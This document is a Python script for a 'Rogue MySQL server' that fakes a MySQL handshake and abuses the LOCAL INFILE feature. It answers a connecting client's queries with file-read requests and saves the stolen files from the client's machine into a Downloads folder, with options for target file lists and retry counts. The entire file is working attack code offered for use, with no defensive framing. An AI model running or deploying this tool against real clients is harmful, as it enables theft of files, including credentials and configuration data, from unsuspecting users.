#!/usr/bin/env python3

import socket
import asyncore
import asynchat
import struct
import logging
import logging.handlers
import argparse
import os
import sys
import signal

DEBUG = False
PORT = 3306
LOG_FILE = 'rogueSQL.log'
VERBOSE = False
SAVE_FOLDER = os.sep.join(os.path.abspath(__file__).split(os.sep)[:-1]) + os.sep + 'Downloads' + os.sep
ATTEMPTS = 3

# Logging stuff - Fixed for text mode with console output
log = logging.getLogger(__name__)
log.setLevel(logging.INFO)

# File handler
tmp_format = logging.handlers.WatchedFileHandler(LOG_FILE, 'a')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(tmp_format)

# Console handler for docker logs
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(console_handler)

parser = argparse.ArgumentParser(prog='RogueSQL', description='Rogue MySQL server')
parser.add_argument("-p", metavar='port', help='port to run the server on', type=int)
parser.add_argument("-f", metavar='filename', help="specify a single filename to retrieve")
parser.add_argument("-l", metavar='filelist', help="path to file with list of files for download")
parser.add_argument("-a", metavar='attempts', help='how many times to request a file before giving up', type=int)
parser.add_argument("-v", action='store_true', help='toggle verbosity')
parser.add_argument("-d", action='store_true', help='log debug messages')

def handler(sig, frame):
    print('[+] Exiting now...')
    sys.exit(0)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('<HbB')
    packet_header_long = struct.Struct('<HbbB')

    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __bytes__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num % 255)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num % 255)

        if isinstance(self.payload, str):
            payload_bytes = self.payload.encode('latin1')
        else:
            payload_bytes = self.payload

        result = header + payload_bytes
        return result

    def __str__(self):
        return self.__bytes__().decode('latin1')

    def __repr__(self):
        return repr(bytes(self))

    @staticmethod
    def parse(raw_data):
        if isinstance(raw_data, str):
            raw_data = raw_data.encode('latin1')
        packet_num = raw_data[0]
        payload = raw_data[1:]
        return mysql_packet(packet_num, payload)

class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.filenumber = 0
        self.current_filename = ''
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False

        greeting = (
            b'\x0a' +  # Protocol
            b'5.6.28-0ubuntu0.14.04.1\0' +
            b'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00'
        )

        self.push(mysql_packet(0, greeting))
        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        if DEBUG:
            log.debug('Pushed: %s', data)
        data = bytes(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        self.ibuffer.append(data)

    def found_terminator(self):
        data = b"".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = data[0] + 256*data[1] + 65536*data[2] + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != 0:
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                # MySQL resets packet numbers to 0 for each new command
                # Only enforce strict ordering within a command sequence
                # But if we're in File substate, packet 0 might be file data
                if packet.packet_num == 0 and self.sub_state != 'File':
                    # New command - reset sequence
                    self.order = 1
                elif self.order != packet.packet_num:
                    if DEBUG:
                        log.warning(f"Expected packet {self.order}, got {packet.packet_num}")
                    self.order = packet.packet_num + 1
                else:
                    self.order = packet.packet_num + 1

                if packet.packet_num == 0 and self.sub_state != 'File':
                    global prevFilename
                    global failCount

                    payload = packet.payload if isinstance(packet.payload, bytes) else packet.payload.encode('latin1')

                    if DEBUG:
                        log.info(f"Received packet 0 with payload type: {hex(payload[0]) if len(payload) > 0 else 'empty'}, length: {len(payload)}")

                    if payload[0:1] == b'\x03':
                        # Set the current file
                        self.current_filename = filelist[self.filenumber]

                        if DEBUG:
                            log.info('Previous request: %s; Next request: %s' % (prevFilename, self.current_filename))

                        if self.current_filename == prevFilename:
                            # Means a failed request previously
                            failCount += 1

                            if failCount != ATTEMPTS:
                                print('[-] Moving on from this file in ' + str(ATTEMPTS - failCount) + ' attempt/s')
                            else:
                                print('[-] Moving on to next file')
                                del filelist[self.filenumber]
                                failCount = 0
                        if len(filelist) == 1:
                            print('[+] End of file list reached')
                            print('[+] Exiting now...')
                            sys.exit(0)

                        self.current_filename = filelist[self.filenumber]

                        file_request = b'\xFB' + self.current_filename.encode('utf-8')
                        PACKET = mysql_packet(packet, file_request)

                        if DEBUG:
                            log.info('Requesting for file: %s' % self.current_filename)
                        print('[+] Requesting %s' % self.current_filename)

                        prevFilename = self.current_filename

                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.order = 2  # Expect next packet to be 2 after file request (packet 1)
                        self.push(PACKET)

                    elif payload[0:1] == b'\x1b':
                        if DEBUG:
                            log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            b'\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()

                    elif payload[0:1] == b'\x02':
                        self.push(mysql_packet(
                            packet, b'\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()

                    elif payload == b'\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()

                else:
                    # Received file handling
                    if self.sub_state == 'File':
                        if len(data) == 1:
                            if packet.packet_num < 256 and self.filenumber < len(filelist) - 1:
                                self.current_filename = filelist[self.filenumber]
                                self.set_terminator(3)
                                self.state = 'LEN'
                                self.sub_state = 'File'
                                file_request = b'\xFB' + self.current_filename.encode('utf-8')
                                self.push(
                                    mysql_packet(packet, file_request)
                                )
                            else:
                                self.push(
                                    mysql_packet(packet, b'\0\0\0\x02\0\0\0')
                                )
                                sys.exit(0)
                        else:
                            payload = packet.payload if isinstance(packet.payload, bytes) else packet.payload.encode('latin1')
                            with open(SAVE_FOLDER + os.path.normpath(self.current_filename).split(os.sep)[-1], 'ab') as fl:
                                fl.write(payload)
                                if self.current_filename not in obtained:
                                    print('[+] File %s obtained' % self.current_filename)
                                    obtained.add(self.current_filename)
                                    del filelist[self.filenumber]

                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, b'\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        raise ValueError('Unknown packet')

            except LastPacket:
                if DEBUG:
                    log.info('Last packet')

                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)

            except OutOfOrder:
                if DEBUG:
                    log.warning('Packets out of order')
                self.push(None)
                self.close_when_done()
        else:
            if DEBUG:
                log.error('Unknown state')
            self.push(b'None')
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Data received from: %s' % pair[1][0])
            print('[+] Data received from %s' % pair[1][0])
            tmp = http_request_handler(pair)

if __name__ == '__main__':

    filelist = list()
    obtained = set()
    failCount = 0
    prevFilename = ''

    args = parser.parse_args()
    if args.d:
        DEBUG = args.d
    if args.l:
        try:
            filelist += [x for x in open(args.l, 'r').read().split('\n') if x]
        except IOError:
            print('[-] Error: List file not found')
            sys.exit(1)
    else:
        if not args.f:
            print('[-] Error: No files specified')
            sys.exit(1)
        else:
            filelist.append(args.f)
    if args.p:
        PORT = args.p
    if args.a:
        ATTEMPTS = args.a
    if args.v:
        VERBOSE = args.v

    if not os.path.exists(SAVE_FOLDER):
        os.mkdir(SAVE_FOLDER)

    filelist.append('')

    print('Rogue MySQL Server')
    print('[+] Target files:')
    for file in filelist:
        if file != '':
            print('\t' + file)

    print('[+] Starting listener on port ' + str(PORT)  + '... Ctrl+C to stop\n')

    listener = mysql_listener()
    signal.signal(signal.SIGINT, handler)
    asyncore.loop()
